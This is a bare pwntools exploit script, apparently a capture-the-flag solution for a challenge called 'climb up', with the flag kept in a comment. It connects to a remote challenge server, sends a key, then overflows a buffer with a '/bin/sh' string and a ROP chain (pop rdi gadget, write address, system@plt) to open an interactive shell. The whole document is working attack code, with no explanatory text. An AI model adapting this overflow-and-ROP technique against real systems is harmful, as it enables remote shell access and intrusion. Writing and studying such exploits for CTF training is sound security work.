#exploit for climb up
#this exploit worked live during the ctf
#flag=FL4G{S0_Th4t5_h0w_u_R0p3}
from pwn import *
target=remote('initpwn.online',5130)
#target=process('./climb')

context.terminal=["tmux","split","-h"]
#gdb.attach(target,'''break *0x40088D ''')
print(target.recvuntil(":-"))
target.sendline("A")

print(target.recvuntil(":"))
target.sendline("k3y_t0_sh")

writeaddr=0x601100
ret=0x400626
poprdi=0x400953
systemplt=0x400670

print(target.recvline())
payload="/bin/sh #"+"\x00"+"A"*(0x88-10)
payload+=p64(poprdi)
payload+=p64(writeaddr)
payload+=p64(systemplt)

target.sendline(payload)
target.interactive()
